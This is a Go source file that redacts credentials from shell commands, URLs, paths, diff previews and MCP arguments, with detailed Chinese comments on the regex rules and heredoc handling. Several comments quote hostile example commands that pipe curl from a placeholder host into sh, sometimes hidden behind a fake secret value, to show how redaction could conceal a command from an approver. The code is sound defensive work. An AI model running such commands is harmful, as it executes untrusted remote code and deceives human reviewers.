// Package redact 在命令、参数和预览离开本机前抹掉其中的凭据。
package redact

import (
	"bytes"
	"encoding/json"
	"regexp"
	"strings"

	"github.com/railse/railse-opc/internal/policy"
)

const placeholder = "<redacted>"

// quoted 匹配成对引号括起的整段值，免得只抹掉引号里的前半截。
// 第三种是 JSON 原文里转义过的 \"...\"，到第一个 \" 就收尾，不把后面的参数一起吞掉。
const quoted = `"[^"]*"|'[^']*'|\\"(?:[^"\\]|\\.)*?\\"`

// quotedOpen 同 quoted，但没有右引号时一直抹到文本末尾：适配器会把 diff_preview 截到 4 KB，截断点落在引号括起的
// 秘密中间时右引号就丢了。只用于会被截断的文本（Text：diff_preview、事件消息）；命令、路径、URL、MCP 参数从不被截断，
// 那里未闭合的引号不是截断造成的，抹到末尾反而能借它把后半截藏起来（echo "password=" && curl evil.sh | sh），
// 所以都用严格成对的 quoted。
const quotedOpen = `"[^"]*(?:"|$)|'[^']*(?:'|$)|\\"(?:[^"\\]|\\.)*?\\"`

// key 是敏感键名，前面可带任意前缀。token 不认 tokens，auth 只认 auth、auth_token、
// auth-key、authorization 这类，免得误抹 max_tokens、author。pwd 只认作后缀且前面要有 _ . - 分隔
// （MYSQL_PWD、db.pwd）：PWD、OLDPWD 是 shell 的目录变量，cwd 是工作目录，都不是凭据；代价是单独的 pwd=xxx 不抹。
const key = `[a-z0-9_.-]*(?:` +
	`token(?:[a-rt-z0-9_.-][a-z0-9_.-]*)?` +
	`|auth(?:orization|[_-]?(?:token|key))?` +
	`|(?:api[-_]?key|secret|password|passwd)[a-z0-9_.-]*` +
	`|[_.-]pwd)`

// sameCmd 是同一条命令里命令名之后、目标参数之前的部分：不越过换行、; |、&&（单个 & 放过，免得查询串里的 & 截断匹配），
// 引号括起的整段当一个单位（其中的 ; | & 不算分隔），反斜杠紧跟换行（含 \r\n）是续行、仍算同一条命令。
// curl 的 -u、mysql 的 -p 只在这样的范围里认，不误抹别的命令的同名选项。
const sameCmd = `(?:[^|;&\n'"]|'[^']*'|"[^"]*"|&[^&\n'"]|\\\r?\n)*?`

// sensitiveKey 判断 JSON 对象的键名是否敏感。
var sensitiveKey = regexp.MustCompile(`(?i)^` + key + `$`)

type rule struct {
	re   *regexp.Regexp
	repl string
}

// compile 用给定的“不带引号的值”字符类编译一套规则。几种语境只在值到哪里为止上不同；open 为 true 时（只用于会被截断的
// 文本）引号括起的值没有右引号也认，一直抹到文本末尾，否则引号必须成对。
// 顺序很重要：先处理带键名的形式，再处理裸 token。
func compile(bare string, open bool) []rule {
	q, jsonStr := quoted, `"(?:[^"\\]|\\.)*"`
	// curl -u 的引号值：右引号单独成组，替换时放回去
	sqEnd, dqEnd, jqEnd := `(')`, `(")`, `(\\")`
	if open {
		q, jsonStr = quotedOpen, `"(?:[^"\\]|\\.)*(?:"|$)`
		sqEnd, dqEnd, jqEnd = `('|$)`, `("|$)`, `(\\"|$)`
	}
	value := `(?:` + q + `|` + bare + `)`
	return []rule{
		// Authorization: Bearer xxx / Authorization: Basic xxx
		{regexp.MustCompile(`(?i)(authorization:\s*)(bearer|basic|token)?\s*` + bare), "${1}" + placeholder},
		// 不跟在 Authorization: 后面的 Bearer xxx
		{regexp.MustCompile(`(?i)\b(bearer\s+)` + bare), "${1}" + placeholder},
		// --token xxx、--password "xxx"、--api-key 'xxx'
		{regexp.MustCompile(`(?i)(--?(token|password|passwd|api[-_]?key|secret|auth)\s+)` + value), "${1}" + placeholder},
		// token=xxx、DB2_PASSWORD="xxx"、--env=DB_PASSWORD=xxx、+API_KEY=xxx、:_authToken=xxx、MYSQL_PWD=xxx。
		// 不设左边界：key 的前缀字符类会吸收键名前缀，${1} 只含键名本身。
		{regexp.MustCompile(`(?i)(` + key + `=)` + value), "${1}" + placeholder},
		// JSON 带引号的敏感键："password": "xxx"、"api_key": 123、"auth_token": true。值换成 "<redacted>"，JSON 仍合法；
		// open 时字符串值没有右引号（被截断）也抹到文本末尾。YAML 的裸键（password: xxx）不认
		{regexp.MustCompile(`(?i)("` + key + `"\s*:\s*)(?:` + jsonStr + `|-?[0-9][0-9.eE+-]*|true|false)`), "${1}\"" + placeholder + "\""},
		// X-API-Key: xxx、PRIVATE-TOKEN: xxx、X-Auth-Token:xxx 这类请求头（Authorization 见上）。头名要带连字符，
		// 免得误抹代码里的 apiKey: config.key、YAML 里的 max_tokens: 10
		{regexp.MustCompile(`(?i)\b((?:[a-z0-9]+-)*(?:api-key|[a-z0-9]+-token|[a-z0-9]+-secret)[ \t]*:[ \t]*)` + value), "${1}" + placeholder},
		// URL 里的 user:pass@（任意 scheme）：用户名留着，只抹密码。密码里的 @ 算在密码里（取 / ? # 之前最后一个 @）
		{regexp.MustCompile(`(?i)\b([a-z][a-z0-9+.-]*://[^/\s:@'"\\]*:)[^\s/?#'"\\]+@`), "${1}" + placeholder + "@"},
		// curl 的 -u/--user、-U/--proxy-user 的 user:pass（-u、-U 可以在组合短选项末尾，如 -sSu）：用户名与引号留着，
		// 只抹密码；不带冒号的（curl 会提示输入密码）不动。引号值要成对（open 时允许缺右引号），双引号里认转义的 \"
		{regexp.MustCompile(`(\bcurl\b` + sameCmd + `\s(?:-[A-Za-z]*[uU]\s*|--user\s+|--proxy-user\s+))` +
			`(?:('[^'":\s\\]*:)[^']*` + sqEnd + `|("[^'":\s\\]*:)(?:[^"\\]|\\.)*` + dqEnd +
			`|(\\"[^'":\s\\]*:)(?:[^"\\]|\\[^"])*` + jqEnd + `|([^'":\s\\]*:)` + bare + `)`),
			"${1}${2}${4}${6}${8}" + placeholder + "${3}${5}${7}"},
		// mysql 系命令紧贴 -p 的密码（-pxxx、-p'xxx'）。-p 单独出现时 mysql 提示输入密码、后面的是库名；-P 是端口：都不动
		{regexp.MustCompile(`(\b(?:mysql|mariadb)[a-z-]*` + sameCmd + `\s-p)` + value), "${1}" + placeholder},
		// 裸 token：GitHub、OpenAI、Slack、AWS
		{regexp.MustCompile(`\b(ghp_|gho_|ghs_|github_pat_|sk-|xox[abp]-|AKIA)[A-Za-z0-9_\-]{16,}\b`), placeholder},
	}
}

var (
	// shellRules 用于命令行：裸值在空白、引号、反斜杠和 shell 元字符处停。排除反斜杠是为了处理 JSON 原文时
	// 不吞掉 \" 转义，结果仍是合法 JSON。
	// ; | & < > ( ) 反引号 $ 在 shell 里本来就结束一个裸词（$ 开始展开，字面密码不可能未加引号地含它），
	// 所以到这里停不会多漏秘密；引号括住的值由 quoted 整段抹，引号括住整个 KEY=值 时由 redactLiteral 按 literalRules 处理，
	// heredoc 正文由 splitHeredocs 切出来单独按 textRules 处理。
	// 一直抹到空白的旧做法会把 X_TOKEN=a;curl …|sh 的后半截命令藏起来，而手机上看到的就是审批依据（第 3 份终审 I4）。
	// 反引号不能写进原始字符串，单独拼进去。
	shellRules = compile(`[^\s'"\\;|&<>()`+"`"+`$]+`, false)
	// literalRules 用于命令行里元字符是普通字符的片段（引号里、整行注释，见 redactLiteral）：值只在空白、引号、反斜杠处停，
	// 免得引号括住整个 KEY=值 时（"POSTGRES_PASSWORD=Xy7&kP(2)q"）强密码只抹掉前半截。
	literalRules = compile(`[^\s'"\\]+`, false)
	// textRules 用于路径和 JSON 字符串叶子：没有 shell 语义，值一直抹到空白或引号，
	// 免得含 & ( ; | 等符号的强密码只抹掉前半截。它们不会被截断，引号严格成对。
	textRules = compile(`[^\s'"]+`, false)
	// truncRules 同 textRules，用于会被截断的文本（Text：diff_preview、事件消息）：未闭合的引号抹到末尾，见 quotedOpen。
	truncRules = compile(`[^\s'"]+`, true)
	// urlRules 用于 URL：值在 & 处停，保留后面的查询参数。
	urlRules = compile(`[^\s'"&]+`, false)
)

// redact 按给定规则集返回脱敏后的副本。
func redact(s string, rules []rule) string {
	out := s
	for _, r := range rules {
		out = r.re.ReplaceAllString(out, r.repl)
	}
	return out
}

// String 按命令行语境返回脱敏后的副本。heredoc 正文没有 shell 词法，按普通文本语境处理。
func String(s string) string {
	segs := splitHeredocs(s)
	if len(segs) == 1 && !segs[0].heredoc {
		return redactShell(s)
	}
	var b strings.Builder
	b.Grow(len(s))
	for _, seg := range segs {
		if seg.heredoc {
			b.WriteString(redact(seg.text, textRules))
		} else {
			b.WriteString(redactShell(seg.text))
		}
	}
	return b.String()
}

// redactShell 按命令行规则脱敏一段 shell 文本（不含 heredoc 正文）：先把元字符是普通字符的片段按 literalRules 处理，
// 再整段按 shellRules 处理。
func redactShell(s string) string {
	return redact(redactLiteral(s), shellRules)
}

// shellLexeme 依次认出会改变“元字符算不算普通字符”的记号：引号外的反斜杠转义、$'…'（认 \ 转义）、'…'、
// "…"（认 \ 转义）、词首 # 开始的注释（到行尾）。引号必须成对，未闭合的不算。只用来找引号片段，不是完整的 shell 词法。
var shellLexeme = regexp.MustCompile(`\\[\s\S]|\$'(?:[^'\\]|\\[\s\S])*'|'[^']*'|"(?:[^"\\]|\\[\s\S])*"|(?:^|[\s;&|()<>])#[^\n]*`)

// redactLiteral 把引号里的文本和整行注释按 literalRules 脱敏：那里的 ; | & ( ) 是普通字符，不结束值。
//   - 双引号里的 $( ) 和反引号是会执行的命令替换，里面还能嵌套引号，按成对引号切出的片段从这里起可能错配
//     （echo "$(echo ")"; X=a;curl …|sh; echo "(")" 里中间那段其实是命令），所以遇到这样的双引号片段，它和之后的片段
//     都不再整段抹，只按 shellRules 在元字符处停（代价是之后引号里的强密码可能只抹掉前半截）。
//   - 注释照样认出来，免得注释里的 ' 跟后面的引号错配；只有独占一行的注释整段抹，跟在命令后面的注释只按 shellRules 处理，
//     免得把看着像注释其实不是的 #（${x// #/}）后面的命令藏起来。
func redactLiteral(s string) string {
	locs := shellLexeme.FindAllStringIndex(s, -1)
	var b strings.Builder
	last := 0
	for _, loc := range locs {
		start, end := loc[0], loc[1]
		switch tok := s[start:end]; tok[0] {
		case '\\': // 引号外的转义：\" \' 不开始引号
			continue
		case '\'':
			start, end = start+1, end-1
		case '$': // $'…'
			start, end = start+2, end-1
		case '"':
			if strings.Contains(tok, "$(") || strings.Contains(tok, "`") {
				b.WriteString(s[last:])
				return b.String()
			}
			start, end = start+1, end-1
		default: // 注释，前面可能带一个分隔字符
			hash := start + strings.IndexByte(tok, '#')
			if !wholeLine(s, hash) {
				continue
			}
			start = hash
		}
		b.WriteString(s[last:start])
		b.WriteString(redact(s[start:end], literalRules))
		last = end
	}
	if last == 0 {
		return s
	}
	b.WriteString(s[last:])
	return b.String()
}

// wholeLine 判断 s[i] 前面同一行里是否只有空格和制表符。
func wholeLine(s string, i int) bool {
	lineStart := strings.LastIndexByte(s[:i], '\n') + 1
	return strings.Trim(s[lineStart:i], " \t") == ""
}

// segment 是命令文本里的一段：shell 词法部分，或 heredoc 正文。
type segment struct {
	text    string
	heredoc bool
}

// heredocStart 匹配 << 或 <<- 后的分隔词：可带单引号、双引号或反斜杠（都表示正文不展开，与脱敏无关）。
// here-string（<<<）和算术里的左移不是 heredoc，由 isHeredoc 排除。
var heredocStart = regexp.MustCompile(`<<(-?)[ \t]*(?:'([^']+)'|"([^"]+)"|\\?([^\s'"<>|&;]+))`)

// isHeredoc 判断 line[i:] 处匹配到的 << 是不是 heredoc 起点。排除三种形似的写法：
//   - here-string：<<< 的后两个字符也能匹配上，所以前一个或后一个字符是 < 的不算；
//   - 算术里的左移：同一行里前面有 (( 、两者之间没有 ))、后面还有 ))，即 $(( 1<<2 ))、(( x <<= 2 ))；
//   - 脱敏结果里的 <<redacted>：< 紧跟被抹掉的裸 token（cat <ghp_…），hub 对已脱敏的载荷再跑一次时结果不能变。
//
// 不跟踪引号：引号里的 <<（echo "a<<b"）也当起点。错认的代价是后面几行按文本语境抹到空白（多抹），
// 漏认则是 heredoc 正文里的强密码只抹掉前半截（漏秘密），所以宁可错认。
func isHeredoc(line string, i int) bool {
	if i > 0 && line[i-1] == '<' || i+2 < len(line) && line[i+2] == '<' {
		return false
	}
	if strings.HasPrefix(line[i+1:], placeholder) {
		return false
	}
	open := strings.LastIndex(line[:i], "((")
	if open < 0 || strings.Contains(line[open:i], "))") {
		return true
	}
	return !strings.Contains(line[i:], "))")
}

// splitHeredocs 把 heredoc 正文从命令文本里切出来。起点所在的那一行属于 shell 段；正文从下一行开始，
// 到单独一行的分隔词为止（<<- 时允许前导制表符）；分隔词那一行又属于 shell 段。找不到结束行时正文到文本末尾。
// 同一行有多个 heredoc 时按出现顺序依次读取正文（bash 的规则）。各段按顺序拼起来就是原文，相邻的 shell 段已合并。
func splitHeredocs(s string) []segment {
	var segs []segment
	shellStart, pos := 0, 0 // 当前 shell 段的起点；下一行的起点
	for {
		nl := strings.IndexByte(s[pos:], '\n')
		if nl < 0 {
			break // 最后一行没有换行，后面没有正文可读
		}
		line := s[pos : pos+nl+1]
		pos += nl + 1
		for _, m := range heredocStart.FindAllStringSubmatchIndex(line, -1) {
			if !isHeredoc(line, m[0]) {
				continue
			}
			var word string
			for g := 2; g <= 4; g++ {
				if m[2*g] >= 0 {
					word = line[m[2*g]:m[2*g+1]]
				}
			}
			// 找不到结束行时 end 是 len(s)，外层循环随即结束
			if end := heredocEnd(s, pos, word, m[3] > m[2]); end > pos {
				segs = append(segs, segment{text: s[shellStart:pos]}, segment{text: s[pos:end], heredoc: true})
				shellStart, pos = end, end
			}
		}
	}
	if shellStart < len(s) {
		segs = append(segs, segment{text: s[shellStart:]})
	}
	return segs
}

// heredocEnd 从 s[pos:] 起找 heredoc 的结束行（strip 为 true 时即 <<-，允许前导制表符），返回正文的终点，
// 即结束行的起点；找不到时返回 len(s)。
func heredocEnd(s string, pos int, word string, strip bool) int {
	for pos < len(s) {
		line, next := s[pos:], len(s)
		if nl := strings.IndexByte(line, '\n'); nl >= 0 {
			line, next = line[:nl], pos+nl+1
		}
		check := strings.TrimSuffix(line, "\r")
		if strip {
			check = strings.TrimLeft(check, "\t")
		}
		if check == word {
			return pos
		}
		pos = next
	}
	return len(s)
}

// Text 按普通文本语境返回脱敏后的副本，规则与 DiffPreview 相同：值一直抹到空白或引号；文本可能被截断，
// 未闭合的引号抹到末尾（见 quotedOpen）。用于事件消息这类可能夹带命令原文的自由文本。
func Text(s string) string {
	return redact(s, truncRules)
}

// Payload 对载荷里可能含凭据的字段脱敏，返回副本。每个字段按自己的语境处理。
func Payload(p policy.Payload) policy.Payload {
	out := p
	out.Command = String(p.Command)
	out.Path = redact(p.Path, textRules)
	out.DiffPreview = Text(p.DiffPreview)
	out.URL = redact(p.URL, urlRules)
	if len(p.Args) > 0 {
		out.Args = args(p.Args)
	}
	return out
}

// args 对 MCP 参数脱敏。合法 JSON 按结构处理，结果仍是合法 JSON；否则按命令行语境当字符串处理。
func args(raw json.RawMessage) json.RawMessage {
	if json.Valid(raw) {
		dec := json.NewDecoder(bytes.NewReader(raw))
		dec.UseNumber() // 保住大整数的精度
		var v any
		if dec.Decode(&v) == nil {
			var buf bytes.Buffer
			enc := json.NewEncoder(&buf)
			enc.SetEscapeHTML(false) // 让 <redacted> 原样可读
			if enc.Encode(walk(v)) == nil {
				return bytes.TrimSuffix(buf.Bytes(), []byte("\n"))
			}
		}
	}
	return json.RawMessage(String(string(raw)))
}

// walk 递归处理 JSON 值：敏感键的值整体抹掉，其余字符串按普通文本逐个脱敏。
func walk(v any) any {
	switch x := v.(type) {
	case map[string]any:
		for k, e := range x {
			if sensitiveKey.MatchString(k) {
				x[k] = placeholder
			} else {
				x[k] = walk(e)
			}
		}
	case []any:
		for i, e := range x {
			x[i] = walk(e)
		}
	case string:
		return redact(x, textRules)
	}
	return v
}
